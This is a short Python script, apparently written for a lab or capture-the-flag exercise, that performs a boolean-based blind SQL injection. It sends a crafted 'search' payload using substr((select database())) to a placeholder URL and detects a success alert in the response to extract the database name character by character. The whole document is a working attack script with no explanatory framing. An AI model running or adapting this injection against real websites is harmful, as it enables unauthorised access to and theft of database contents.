import requests
from bs4 import BeautifulSoup

url = 'https://X.X.X'
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&",;:!()[]_-'
n = 1
dbname = []


for i in range(10):
    for char in (chars):
        login_data = {
            'search': f"' OR '1' AND substr((select database()),{n},1)='{char}"
        }
        response = requests.post(url, data=login_data)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            alert_success_tags = soup.find_all('div', class_='alert alert-success text-center')
            
            if alert_success_tags :
                print(f":{char}")
                dbname.append(char)
                n += 1
                break
            else:
                continue
        else:
            print("Connexion failed")

    print("database name :","".join(dbname))
